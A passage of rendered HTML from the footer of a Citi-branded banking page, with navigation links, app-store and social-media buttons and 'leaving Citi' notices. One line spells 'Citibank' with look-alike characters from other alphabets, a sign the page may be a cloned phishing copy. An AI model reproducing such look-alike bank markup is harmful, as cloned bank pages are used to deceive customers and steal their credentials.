                      <h3 _ngcontent-ssr-c115="" class="title" id="nav-list-header3">Rates</h3><!----><button
                        _ngcontent-ssr-c115="" type="button" class="title" aria-controls="list3"
                        aria-expanded="false">Rates</button><!---->
                      <ul _ngcontent-ssr-c115="" id="list3" aria-labelledby="nav-list-header3" aria-hidden="false">
                        <li _ngcontent-ssr-c115="" id="navPersonal Banking"><citi-cta _ngcontent-ssr-c115=""
                            type="tertiary" _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                              id="05ab12df-5e91-5274-adc8-e29a15a94e6c" class="btn btn-link">Personal
                              Banking</a><!----><!----><!----></citi-cta></li>
                        <li _ngcontent-ssr-c115="" id="navCreditCards"><citi-cta _ngcontent-ssr-c115="" type="tertiary"
                            _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                              id="b98160de-70e4-ce31-0b52-f42aa9270adf" class="btn btn-link">Credit
                              Cards</a><!----><!----><!----></citi-cta></li>
                        <li _ngcontent-ssr-c115="" id="navMortgage"><citi-cta _ngcontent-ssr-c115="" type="tertiary"
                            _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                              id="f3e95693-7a44-86d7-2776-fb9488d57f4c"
                              class="btn btn-link">Mortgage</a><!----><!----><!----></citi-cta></li>
                        <li _ngcontent-ssr-c115="" id="navHomeEquity"><citi-cta _ngcontent-ssr-c115="" type="tertiary"
                            _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                              id="f3de7afc-0cf7-521c-fca3-d3639703c5e6" class="btn btn-link">Home
                              Equity</a><!----><!----><!----></citi-cta></li>
                        <li _ngcontent-ssr-c115="" id="navLending"><citi-cta _ngcontent-ssr-c115="" type="tertiary"
                            _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                              id="80f2a455-3c29-8607-49ab-57570555fc02"
                              class="btn btn-link">Lending</a><!----><!----><!----></citi-cta></li><!----><!----><!---->
                      </ul><!---->
                    </div>
                    <div _ngcontent-ssr-c115="" role="group" class="last section">
                      <h3 _ngcontent-ssr-c115="" class="title" id="nav-list-header4">Help &amp; Support</h3>
                      <!----><button _ngcontent-ssr-c115="" type="button" class="title" aria-controls="list4"
                        aria-expanded="false">Help &amp; Support</button><!---->
                      <ul _ngcontent-ssr-c115="" id="list4" aria-labelledby="nav-list-header4" aria-hidden="false">
                        <li _ngcontent-ssr-c115="" id="navContactUs"><citi-cta _ngcontent-ssr-c115="" type="tertiary"
                            _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                              id="a34c0f27-dc36-b8d9-82f1-c5ad79a43a8e" class="btn btn-link">Contact
                              Us</a><!----><!----><!----></citi-cta></li>
                        <li _ngcontent-ssr-c115="" id="navHelpFAQs"><citi-cta _ngcontent-ssr-c115="" type="tertiary"
                            _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                              id="da52d945-cca7-11d6-8bd6-f81c09ae929b" class="btn btn-link">Help &amp;
                              FAQs</a><!----><!----><!----></citi-cta></li>
                        <li _ngcontent-ssr-c115="" id="navSecurityCenter"><citi-cta _ngcontent-ssr-c115=""
                            type="tertiary" _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                              id="cfdd47eb-96d0-aeab-8303-64ed0a03a28e" class="btn btn-link">Security
                              Center</a><!----><!----><!----></citi-cta></li><!----><!----><!---->
                      </ul><!---->
                    </div><!----><!---->
                    <div _ngcontent-ssr-c115="" class="section">
                      <div _ngcontent-ssr-c115="" class="images"><!---->
                        <div _ngcontent-ssr-c115=""><span _ngcontent-ssr-c115="" id="homeSprite" role="img"
                            aria-label="Equal housing lender" alt="Equal housing lender"
                            class="brandingSprite equalHousing"></span></div><!---->
                      </div><!---->
                    </div>
                  </div>
                </div><!---->
              </citi-footer-navigation><citi-social-media _ngcontent-ssr-c114="" _nghost-ssr-c118="">
                <div _ngcontent-ssr-c118="" class="social">
                  <div _ngcontent-ssr-c118="" class="content">
                    <div _ngcontent-ssr-c118="" class="socialItems">
                      <div _ngcontent-ssr-c118=""><button _ngcontent-ssr-c118="" data-target="#modal00"
                          aria-label="Get it on Google Play" class="assets/img/googlePlay@3x.png">
                          <div _ngcontent-ssr-c118="" class="Googleplay"></div>
                        </button><!----><!----><!----><!----><citi-modal _ngcontent-ssr-c118=""
                          primarybuttontarget="_blank" _nghost-ssr-c58="">
                          <div _ngcontent-ssr-c58="" tabindex="-1" class="modal citi-modal fade" id="modal00"
                            style="display: none;">
                            <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-dialog">
                              <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                              </div>
                              <div _ngcontent-ssr-c58="" cdktrapfocus="" class="modal-content">
                                <div _ngcontent-ssr-c58="" class="modal-header"><button _ngcontent-ssr-c58=""
                                    type="button" aria-label="Close modal" class="close-button"><span
                                      _ngcontent-ssr-c58="" class="sr-only">Close</span></button><!----></div>
                                <div _ngcontent-ssr-c58="" role="document">
                                  <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-body">
                                    <div _ngcontent-ssr-c58="" tabindex="-1" class="header">
                                      <div _ngcontent-ssr-c118="" title="">Important Information</div>
                                    </div><!----><!---->
                                    <div _ngcontent-ssr-c58="" class="modal-body-content" tabindex="-1">
                                      <p _ngcontent-ssr-c118="">You are leaving a Citi Website and going to a third
                                        party site. That site may have a privacy policy different from Citi and may
                                        provide less security than this Citi site. Citi and its affiliates are not
                                        responsible for the products, services, and content on the third party website.
                                        Do you want to go to the third party site? <br><br>Citi is not responsible for
                                        the products, services or facilities provided and/or owned by other companies.
                                      </p>
                                    </div>
                                  </div>
                                </div>
                                <div _ngcontent-ssr-c58="" class="modal-footer">
                                  <div _ngcontent-ssr-c58="" class="text-right">
                                    <div _ngcontent-ssr-c58="" class="citi-modal-controls"><citi-cta
                                        _ngcontent-ssr-c58="" class="modal-primary-btn btnclassTest"
                                        _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_blank"
                                          id="8fe26b5f-4b0c-cf82-9241-8c847d9598e9"
                                          aria-describedby="18189c57-d84e-0bce-969e-b43b47de3f63_ariadescription"
                                          class="btn btn-primary">Continue</a><!----><!----><span _ngcontent-ssr-c55=""
                                          aria-hidden="true" class="sr-only"
                                          id="18189c57-d84e-0bce-969e-b43b47de3f63_ariadescription">Opens in new
                                          window</span><!----></citi-cta><!----><!----></div><!---->
                                  </div><!----><!---->
                                </div>
                              </div>
                              <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                              </div>
                            </div>
                          </div>
                          <div _ngcontent-ssr-c58="" class="modal-backdrop citi-modal-backdrop fade"
                            style="display: none;"></div>
                        </citi-modal></div>
                      <div _ngcontent-ssr-c118=""><button _ngcontent-ssr-c118="" data-target="#modal01"
                          aria-label="Download on the App Store" class="assets/img/appStore@3x.png">
                          <div _ngcontent-ssr-c118="" class="Appstore"></div>
                        </button><!----><!----><!----><!----><citi-modal _ngcontent-ssr-c118=""
                          primarybuttontarget="_blank" _nghost-ssr-c58="">
                          <div _ngcontent-ssr-c58="" tabindex="-1" class="modal citi-modal fade" id="modal01"
                            style="display: none;">
                            <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-dialog">
                              <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                              </div>
                              <div _ngcontent-ssr-c58="" cdktrapfocus="" class="modal-content">
                                <div _ngcontent-ssr-c58="" class="modal-header"><button _ngcontent-ssr-c58=""
                                    type="button" aria-label="Close modal" class="close-button"><span
                                      _ngcontent-ssr-c58="" class="sr-only">Close</span></button><!----></div>
                                <div _ngcontent-ssr-c58="" role="document">
                                  <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-body">
                                    <div _ngcontent-ssr-c58="" tabindex="-1" class="header">
                                      <div _ngcontent-ssr-c118="" title="">Important Information</div>
                                    </div><!----><!---->
                                    <div _ngcontent-ssr-c58="" class="modal-body-content" tabindex="-1">
                                      <p _ngcontent-ssr-c118="">You are leaving a Citi Website and going to a third
                                        party site. That site may have a privacy policy different from Citi and may
                                        provide less security than this Citi site. Citi and its affiliates are not
                                        responsible for the products, services, and content on the third party website.
                                        Do you want to go to the third party site? <br><br>Citi is not responsible for
                                        the products, services or facilities provided and/or owned by other companies.
                                      </p>
                                    </div>
                                  </div>
                                </div>
                                <div _ngcontent-ssr-c58="" class="modal-footer">
                                  <div _ngcontent-ssr-c58="" class="text-right">
                                    <div _ngcontent-ssr-c58="" class="citi-modal-controls"><citi-cta
                                        _ngcontent-ssr-c58="" class="modal-primary-btn btnclassTest"
                                        _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_blank"
                                          id="73ddf1ee-d0ef-c201-135a-a0af12858b9c"
                                          aria-describedby="a3aa5eb5-b235-93f9-8ff4-3dba13b88e69_ariadescription"
                                          class="btn btn-primary">Continue</a><!----><!----><span _ngcontent-ssr-c55=""
                                          aria-hidden="true" class="sr-only"
                                          id="a3aa5eb5-b235-93f9-8ff4-3dba13b88e69_ariadescription">Opens in new
                                          window</span><!----></citi-cta><!----><!----></div><!---->
                                  </div><!----><!---->
                                </div>
                              </div>
                              <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                              </div>
                            </div>
                          </div>
                          <div _ngcontent-ssr-c58="" class="modal-backdrop citi-modal-backdrop fade"
                            style="display: none;"></div>
                        </citi-modal></div>
                      <div _ngcontent-ssr-c118=""><!----><citi-modal _ngcontent-ssr-c118="" primarybuttontarget="_blank"
                          _nghost-ssr-c58="">
                          <div _ngcontent-ssr-c58="" tabindex="-1" class="modal citi-modal fade" id="JDPower-0"
                            style="display: none;">
                            <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-dialog">
                              <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                              </div>
                              <div _ngcontent-ssr-c58="" cdktrapfocus="" class="modal-content">
                                <div _ngcontent-ssr-c58="" class="modal-header"><button _ngcontent-ssr-c58=""
                                    type="button" aria-label="Close modal" class="close-button"><span
                                      _ngcontent-ssr-c58="" class="sr-only">Close</span></button><!----></div>
                                <div _ngcontent-ssr-c58="" role="document">
                                  <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-body">
                                    <div _ngcontent-ssr-c58="" tabindex="-1" class="header">
                                      <div _ngcontent-ssr-c118="" title="">J.D. Power 2019 Mobile App Certification
                                        Program&amp;#8480;&lt;span class='sr-only'&gt;Service Mark&lt;/span&gt;</div>
                                    </div><!----><!---->
                                    <div _ngcontent-ssr-c58="" class="modal-body-content" tabindex="-1">
                                      <p _ngcontent-ssr-c118="">J.D. Power 2019 Mobile App Certification Program℠<span
                                          class="sr-only">Service Mark</span> recognition is based on successful
                                        completion of an audit and exceeding a customer experience benchmark through a
                                        survey of recent servicing interactions. For more information, visit </p><a
                                        _ngcontent-ssr-c118="">jdpower.com/awards</a><!---->
                                    </div>
                                  </div>
                                </div>
                                <div _ngcontent-ssr-c58="" class="modal-footer">
                                  <div _ngcontent-ssr-c58="" class="text-right">
                                    <div _ngcontent-ssr-c58="" class="citi-modal-controls"><citi-cta
                                        _ngcontent-ssr-c58="" class="modal-primary-btn btnclassTest"
                                        _nghost-ssr-c55=""><button _ngcontent-ssr-c55="" type="button"
                                          id="1d0c2037-0a60-950e-47c5-b8a823ec5ca4" role="button"
                                          aria-describedby="c8a9ee76-7b19-5fb4-8752-c3fe6e3a6089_ariadescription"
                                          class="btn btn-primary"
                                          style="text-align: center;">Continue</button><!----><!----><!----><span
                                          _ngcontent-ssr-c55="" aria-hidden="true" class="sr-only"
                                          id="c8a9ee76-7b19-5fb4-8752-c3fe6e3a6089_ariadescription">Opens in new
                                          window</span><!----></citi-cta><!----><!----></div><!---->
                                  </div><!----><!---->
                                </div>
                              </div>
                              <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                              </div>
                            </div>
                          </div>
                          <div _ngcontent-ssr-c58="" class="modal-backdrop citi-modal-backdrop fade"
                            style="display: none;"></div>
                        </citi-modal><!----><citi-modal _ngcontent-ssr-c118="" primarybuttontarget="_blank"
                          _nghost-ssr-c58="">
                          <div _ngcontent-ssr-c58="" tabindex="-1" class="modal citi-modal fade" id="JDPower-1"
                            style="display: none;">
                            <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-dialog">
                              <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                              </div>
                              <div _ngcontent-ssr-c58="" cdktrapfocus="" class="modal-content">
                                <div _ngcontent-ssr-c58="" class="modal-header"><button _ngcontent-ssr-c58=""
                                    type="button" aria-label="Close modal" class="close-button"><span
                                      _ngcontent-ssr-c58="" class="sr-only">Close</span></button><!----></div>
                                <div _ngcontent-ssr-c58="" role="document">
                                  <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-body">
                                    <div _ngcontent-ssr-c58="" tabindex="-1" class="header">
                                      <div _ngcontent-ssr-c118="" title="">Important Information</div>
                                    </div><!----><!---->
                                    <div _ngcontent-ssr-c58="" class="modal-body-content" tabindex="-1">
                                      <p _ngcontent-ssr-c118="">You are leaving a Citi Website and going to a third
                                        party site. That site may have a privacy policy different from Citi and may
                                        provide less security than this Citi site. Citi and its affiliates are not
                                        responsible for the products, services, and content on the third party website.
                                        Do you want to go to the third party site? <br><br>Citi is not responsible for
                                        the products, services or facilities provided and/or owned by other companies.
                                      </p><!---->
                                    </div>
                                  </div>
                                </div>
                                <div _ngcontent-ssr-c58="" class="modal-footer">
                                  <div _ngcontent-ssr-c58="" class="text-right">
                                    <div _ngcontent-ssr-c58="" class="citi-modal-controls"><citi-cta
                                        _ngcontent-ssr-c58="" class="modal-primary-btn btnclassTest"
                                        _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_blank"
                                          id="3c5e1301-3739-53e7-77ca-1a79e86ee372"
                                          aria-describedby="651e5504-c181-d001-558c-70b492374753_ariadescription"
                                          class="btn btn-primary">Continue</a><!----><!----><span _ngcontent-ssr-c55=""
                                          aria-hidden="true" class="sr-only"
                                          id="651e5504-c181-d001-558c-70b492374753_ariadescription">Opens in new
                                          window</span><!----></citi-cta><!----><!----></div><!---->
                                  </div><!----><!---->
                                </div>
                              </div>
                              <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                              </div>
                            </div>
                          </div>
                          <div _ngcontent-ssr-c58="" class="modal-backdrop citi-modal-backdrop fade"
                            style="display: none;"></div>
                        </citi-modal><!----><!----><!----><!----><citi-modal _ngcontent-ssr-c118=""
                          primarybuttontarget="_blank" _nghost-ssr-c58="">
                          <div _ngcontent-ssr-c58="" tabindex="-1" class="modal citi-modal fade" id="modal02"
                            style="display: none;">
                            <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-dialog">
                              <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                              </div>
                              <div _ngcontent-ssr-c58="" cdktrapfocus="" class="modal-content">
                                <div _ngcontent-ssr-c58="" class="modal-header"><button _ngcontent-ssr-c58=""
                                    type="button" aria-label="Close modal" class="close-button"><span
                                      _ngcontent-ssr-c58="" class="sr-only">Close</span></button><!----></div>
                                <div _ngcontent-ssr-c58="" role="document">
                                  <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-body">
                                    <div _ngcontent-ssr-c58="" tabindex="-1" class="header">
                                      <div _ngcontent-ssr-c118="" title=""></div>
                                    </div><!----><!---->
                                    <div _ngcontent-ssr-c58="" class="modal-body-content" tabindex="-1">
                                      <p _ngcontent-ssr-c118=""></p>
                                    </div>
                                  </div>
                                </div>
                                <div _ngcontent-ssr-c58="" class="modal-footer">
                                  <div _ngcontent-ssr-c58="" class="text-right">
                                    <div _ngcontent-ssr-c58="" class="citi-modal-controls"><citi-cta
                                        _ngcontent-ssr-c58="" class="modal-primary-btn btnclassTest"
                                        _nghost-ssr-c55=""><button _ngcontent-ssr-c55="" type="button"
                                          id="c7718e84-444c-29f2-905a-f9df0dd157f1" role="button"
                                          aria-describedby="269033aa-c78d-de5e-dd72-8398b18fe2fd_ariadescription"
                                          class="btn btn-primary"
                                          style="text-align: center;">Continue</button><!----><!----><!----><span
                                          _ngcontent-ssr-c55="" aria-hidden="true" class="sr-only"
                                          id="269033aa-c78d-de5e-dd72-8398b18fe2fd_ariadescription">Opens in new
                                          window</span><!----></citi-cta><!----><!----></div><!---->
                                  </div><!----><!---->
                                </div>
                              </div>
                              <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                              </div>
                            </div>
                          </div>
                          <div _ngcontent-ssr-c58="" class="modal-backdrop citi-modal-backdrop fade"
                            style="display: none;"></div>
                        </citi-modal></div><!---->
                    </div>
                    <div _ngcontent-ssr-c118="" class="socialItems"><!----></div>
                    <div _ngcontent-ssr-c118="" class="socialItems">
                      <div _ngcontent-ssr-c118=""><button _ngcontent-ssr-c118="" data-target="#modal20"
                          aria-label="facebook" class="assets/img/social-media_facebook@3x.png">
                          <div _ngcontent-ssr-c118="" class="facebook"></div>
                        </button><!----><!----><!----><!----><citi-modal _ngcontent-ssr-c118=""
                          primarybuttontarget="_blank" _nghost-ssr-c58="">
                          <div _ngcontent-ssr-c58="" tabindex="-1" class="modal citi-modal fade" id="modal20"
                            style="display: none;">
                            <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-dialog">
                              <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                              </div>
                              <div _ngcontent-ssr-c58="" cdktrapfocus="" class="modal-content">
                                <div _ngcontent-ssr-c58="" class="modal-header"><button _ngcontent-ssr-c58=""
                                    type="button" aria-label="Close modal" class="close-button"><span
                                      _ngcontent-ssr-c58="" class="sr-only">Close</span></button><!----></div>
                                <div _ngcontent-ssr-c58="" role="document">
                                  <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-body">
                                    <div _ngcontent-ssr-c58="" tabindex="-1" class="header">
                                      <div _ngcontent-ssr-c118="" title="">Important Information</div>
                                    </div><!----><!---->
                                    <div _ngcontent-ssr-c58="" class="modal-body-content" tabindex="-1">
                                      <p _ngcontent-ssr-c118="">
                                      <p>You are leaving a Citi Website and going to a third party site. That site may
                                        have a privacy policy different from Citi and may provide less security than
                                        this Citi site. Citi and its affiliates are not responsible for the products,
                                        services, and content on the third party website. Do you want to go to the third
                                        party site?</p>
                                      <p>Citi is not responsible for the products, services or facilities provided
                                        and/or owned by other companies.</p>
                                      </p>
                                    </div>
                                  </div>
                                </div>
                                <div _ngcontent-ssr-c58="" class="modal-footer">
                                  <div _ngcontent-ssr-c58="" class="text-right">
                                    <div _ngcontent-ssr-c58="" class="citi-modal-controls"><citi-cta
                                        _ngcontent-ssr-c58="" class="modal-primary-btn btnclassTest"
                                        _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_blank"
                                          id="2529ddb0-b973-5456-cfbf-7aec35c7057d"
                                          aria-describedby="61415e95-9641-4e27-1d5f-a8cd304ebe0c_ariadescription"
                                          class="btn btn-primary">Continue</a><!----><!----><span _ngcontent-ssr-c55=""
                                          aria-hidden="true" class="sr-only"
                                          id="61415e95-9641-4e27-1d5f-a8cd304ebe0c_ariadescription">Opens in new
                                          window</span><!----></citi-cta><!----><!----></div><!---->
                                  </div><!----><!---->
                                </div>
                              </div>
                              <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                              </div>
                            </div>
                          </div>
                          <div _ngcontent-ssr-c58="" class="modal-backdrop citi-modal-backdrop fade"
                            style="display: none;"></div>
                        </citi-modal></div>
                      <div _ngcontent-ssr-c118=""><button _ngcontent-ssr-c118="" data-target="#modal21"
                          aria-label="twitter" class="assets/img/social-media_twitter@3x.png">
                          <div _ngcontent-ssr-c118="" class="twitter"></div>
                        </button><!----><!----><!----><!----><citi-modal _ngcontent-ssr-c118=""
                          primarybuttontarget="_blank" _nghost-ssr-c58="">
                          <div _ngcontent-ssr-c58="" tabindex="-1" class="modal citi-modal fade" id="modal21"
                            style="display: none;">
                            <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-dialog">
                              <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                              </div>
                              <div _ngcontent-ssr-c58="" cdktrapfocus="" class="modal-content">
                                <div _ngcontent-ssr-c58="" class="modal-header"><button _ngcontent-ssr-c58=""
                                    type="button" aria-label="Close modal" class="close-button"><span
                                      _ngcontent-ssr-c58="" class="sr-only">Close</span></button><!----></div>
                                <div _ngcontent-ssr-c58="" role="document">
                                  <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-body">
                                    <div _ngcontent-ssr-c58="" tabindex="-1" class="header">
                                      <div _ngcontent-ssr-c118="" title="">Important Information</div>
                                    </div><!----><!---->
                                    <div _ngcontent-ssr-c58="" class="modal-body-content" tabindex="-1">
                                      <p _ngcontent-ssr-c118="">
                                      <p>You are leaving a Citi Website and going to a third party site. That site may
                                        have a privacy policy different from Citi and may provide less security than
                                        this Citi site. Citi and its affiliates are not responsible for the products,
                                        services, and content on the third party website. Do you want to go to the third
                                        party site?</p>
                                      <p>Citi is not responsible for the products, services or facilities provided
                                        and/or owned by other companies.</p>
                                      </p>
                                    </div>
                                  </div>
                                </div>
                                <div _ngcontent-ssr-c58="" class="modal-footer">
                                  <div _ngcontent-ssr-c58="" class="text-right">
                                    <div _ngcontent-ssr-c58="" class="citi-modal-controls"><citi-cta
                                        _ngcontent-ssr-c58="" class="modal-primary-btn btnclassTest"
                                        _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_blank"
                                          id="98d21a01-3497-b49f-2b57-c4480e3de0ae"
                                          aria-describedby="8dd692f1-e7e3-07b8-a783-5ad1b0e031ed_ariadescription"
                                          class="btn btn-primary">Continue</a><!----><!----><span _ngcontent-ssr-c55=""
                                          aria-hidden="true" class="sr-only"
                                          id="8dd692f1-e7e3-07b8-a783-5ad1b0e031ed_ariadescription">Opens in new
                                          window</span><!----></citi-cta><!----><!----></div><!---->
                                  </div><!----><!---->
                                </div>
                              </div>
                              <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                              </div>
                            </div>
                          </div>
                          <div _ngcontent-ssr-c58="" class="modal-backdrop citi-modal-backdrop fade"
                            style="display: none;"></div>
                        </citi-modal></div>
                      <div _ngcontent-ssr-c118=""><button _ngcontent-ssr-c118="" data-target="#modal22"
                          aria-label="youtube" class="assets/img/social-media_youtube@3x.png">
                          <div _ngcontent-ssr-c118="" class="youtube"></div>
                        </button><!----><!----><!----><!----><citi-modal _ngcontent-ssr-c118=""
                          primarybuttontarget="_blank" _nghost-ssr-c58="">
                          <div _ngcontent-ssr-c58="" tabindex="-1" class="modal citi-modal fade" id="modal22"
                            style="display: none;">
                            <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-dialog">
                              <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                              </div>
                              <div _ngcontent-ssr-c58="" cdktrapfocus="" class="modal-content">
                                <div _ngcontent-ssr-c58="" class="modal-header"><button _ngcontent-ssr-c58=""
                                    type="button" aria-label="Close modal" class="close-button"><span
                                      _ngcontent-ssr-c58="" class="sr-only">Close</span></button><!----></div>
                                <div _ngcontent-ssr-c58="" role="document">
                                  <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-body">
                                    <div _ngcontent-ssr-c58="" tabindex="-1" class="header">
                                      <div _ngcontent-ssr-c118="" title="">Important Information</div>
                                    </div><!----><!---->
                                    <div _ngcontent-ssr-c58="" class="modal-body-content" tabindex="-1">
                                      <p _ngcontent-ssr-c118="">
                                      <p>You are leaving a Citi Website and going to a third party site. That site may
                                        have a privacy policy different from Citi and may provide less security than
                                        this Citi site. Citi and its affiliates are not responsible for the products,
                                        services, and content on the third party website. Do you want to go to the third
                                        party site?</p>
                                      <p>Citi is not responsible for the products, services or facilities provided
                                        and/or owned by other companies.</p>
                                      </p>
                                    </div>
                                  </div>
                                </div>
                                <div _ngcontent-ssr-c58="" class="modal-footer">
                                  <div _ngcontent-ssr-c58="" class="text-right">
                                    <div _ngcontent-ssr-c58="" class="citi-modal-controls"><citi-cta
                                        _ngcontent-ssr-c58="" class="modal-primary-btn btnclassTest"
                                        _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_blank"
                                          id="32200c6a-e5e6-ba09-5ee2-5b0b170bf227"
                                          aria-describedby="46b36e4f-db41-7418-66e8-6b8ff76a8498_ariadescription"
                                          class="btn btn-primary">Continue</a><!----><!----><span _ngcontent-ssr-c55=""
                                          aria-hidden="true" class="sr-only"
                                          id="46b36e4f-db41-7418-66e8-6b8ff76a8498_ariadescription">Opens in new
                                          window</span><!----></citi-cta><!----><!----></div><!---->
                                  </div><!----><!---->
                                </div>
                              </div>
                              <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                              </div>
                            </div>
                          </div>
                          <div _ngcontent-ssr-c58="" class="modal-backdrop citi-modal-backdrop fade"
                            style="display: none;"></div>
                        </citi-modal></div><!---->
                    </div><!---->
                  </div>
                </div><!---->
              </citi-social-media><citi-footer-sub-navigation _ngcontent-ssr-c114="" _nghost-ssr-c116="">
                <div _ngcontent-ssr-c116="" class="sub-navigation">
                  <div _ngcontent-ssr-c116="" class="content">
                    <p _ngcontent-ssr-c116="" class="copyright">© 2025 Citigroup Inc</p><!---->
                    <ul _ngcontent-ssr-c116="">
                      <li _ngcontent-ssr-c116="" id="subnavTermsConditions"><citi-cta _ngcontent-ssr-c116=""
                          type="tertiary" _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                            id="a5a39491-d065-4a0e-00e6-30c1108db1f9" data-target="#modalId" class="btn btn-link">Terms
                            &amp; Conditions</a><!----><!----><!----></citi-cta><!----><!----><!----><!----></li>
                      <li _ngcontent-ssr-c116="" id="subnavPrivacy"><citi-cta _ngcontent-ssr-c116="" type="tertiary"
                          _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                            id="4d91302c-dbfe-7c13-4695-77b2b348e500" data-target="#modalId"
                            class="btn btn-link">Privacy</a><!----><!----><!----></citi-cta><!----><!----><!----><!---->
                      </li>
                      <li _ngcontent-ssr-c116="" id="subnavNoticeAtCollection"><citi-cta _ngcontent-ssr-c116=""
                          type="tertiary" _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                            id="4846c8ac-feba-de2c-5c35-edd1f4a2043d" data-target="#modalId" class="btn btn-link">Notice
                            at Collection</a><!----><!----><!----></citi-cta><!----><!----><!----><!----></li>
                      <li _ngcontent-ssr-c116="" id="subnavPrivacyHub"><citi-cta _ngcontent-ssr-c116="" type="tertiary"
                          _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                            id="3f508598-8364-a408-5c46-d4f4286c3ebd" data-target="#modalId" class="btn btn-link">CA
                            Privacy Hub</a><!----><!----><!----></citi-cta><!----><!----><!----><!----></li>
                      <li _ngcontent-ssr-c116="" id="subnavAccessibility"><citi-cta _ngcontent-ssr-c116=""
                          type="tertiary" _nghost-ssr-c55=""><!----><a _ngcontent-ssr-c55="" target="_self"
                            id="624ddaff-8a0c-a998-7854-e3af985ca7ef" data-target="#modalId"
                            class="btn btn-link">Accessibility</a><!----><!----><!----></citi-cta><!----><!----><!----><!---->
                      </li>
                      <li _ngcontent-ssr-c116="" id=""><!----><!----><span _ngcontent-ssr-c116=""
                          class="staticLinks">Country &amp; Jurisdictions:</span><!----><!----></li>
                      <li _ngcontent-ssr-c116="" id=""><citi-cta _ngcontent-ssr-c116="" type="tertiary"
                          _nghost-ssr-c55=""><button _ngcontent-ssr-c55="" type="button"
                            id="da0c2e61-b34c-cacb-e0bd-6ca9df884276" data-target="#modalId" class="btn btn-link"
                            style="text-align: center;"><b>United
                              States</b></button><!----><!----><!----><!----></citi-cta><!----><span
                          _ngcontent-ssr-c116="" class="staticLinks" style="font-weight: bold;"> &gt;
                        </span><!----><!----><citi-modal _ngcontent-ssr-c116="" showcancelbutton="true"
                          cancelbuttontext="Cancel" idstr="unitedStates" class="cbolui-ddl-pre" _nghost-ssr-c58="">
                          <div _ngcontent-ssr-c58="" tabindex="-1" class="modal citi-modal fade" id="unitedStates"
                            style="display: none;">
                            <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-dialog">
                              <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                              </div>
                              <div _ngcontent-ssr-c58="" cdktrapfocus="" class="modal-content">
                                <div _ngcontent-ssr-c58="" class="modal-header"><button _ngcontent-ssr-c58=""
                                    type="button" aria-label="Close modal" class="close-button"><span
                                      _ngcontent-ssr-c58="" class="sr-only">Close</span></button><!----></div>
                                <div _ngcontent-ssr-c58="" role="document">
                                  <div _ngcontent-ssr-c58="" tabindex="-1" class="modal-body">
                                    <div _ngcontent-ssr-c58="" tabindex="-1" class="header"></div><!----><!---->
                                    <div _ngcontent-ssr-c58="" class="modal-body-content" tabindex="-1">
                                      <div _ngcontent-ssr-c116="" class="theme-light">
                                        <p _ngcontent-ssr-c116=""></p>
                                        <p _ngcontent-ssr-c116="" class="speedBumpCopy">Get Ꮯіtіbаոk information on the
                                          countries &amp; jurisdictions we serve</p><span _ngcontent-ssr-c116=""
                                          class="selectCountry">Select Country or Jurisdiction</span>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                                <div _ngcontent-ssr-c58="" class="modal-footer">
                                  <div _ngcontent-ssr-c58="" class="text-right">
